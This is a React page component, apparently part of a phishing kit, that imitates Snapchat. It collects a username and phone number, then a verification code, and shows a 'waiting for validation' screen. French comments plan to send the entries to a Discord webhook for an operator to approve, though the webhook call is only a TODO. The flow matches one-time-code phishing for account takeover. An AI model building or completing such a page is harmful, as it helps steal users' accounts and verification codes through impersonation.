import { useState } from "react";
import SnapLogo from "@/components/SnapLogo";
import DisclaimerBox from "@/components/DisclaimerBox";
import SnapForm from "@/components/SnapForm";
import CodeVerification from "@/components/CodeVerification";
import WaitingValidation from "@/components/WaitingValidation";
import SuccessScreen from "@/components/SuccessScreen";

type Step = "form" | "code" | "waiting" | "success";

const Index = () => {
  const [step, setStep] = useState<Step>("form");
  const [formData, setFormData] = useState({ username: "", phone: "" });
  const [codeError, setCodeError] = useState("");

  const handleFormSubmit = (data: { username: string; phone: string }) => {
    setFormData(data);
    setStep("code");
    // TODO: Envoyer webhook Discord ici
  };

  const handleCodeSubmit = (code: string) => {
    // Simuler une vérification
    console.log("Code submitted:", code, "for user:", formData);
    setStep("waiting");
    
    // Simuler l'attente de validation (en vrai ce serait via webhook Discord)
    // Pour demo, on passe automatiquement au succès après 5 secondes
    setTimeout(() => {
      setStep("success");
    }, 5000);
  };

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center px-4 py-12">
      <div className="flex flex-col items-center gap-8 w-full max-w-md">
        <SnapLogo />
        <DisclaimerBox />
        
        {step === "form" && (
          <SnapForm onSubmit={handleFormSubmit} />
        )}
        
        {step === "code" && (
          <CodeVerification onSubmit={handleCodeSubmit} error={codeError} />
        )}
        
        {step === "waiting" && (
          <WaitingValidation />
        )}
        
        {step === "success" && (
          <SuccessScreen />
        )}
      </div>
    </div>
  );
};

export default Index;
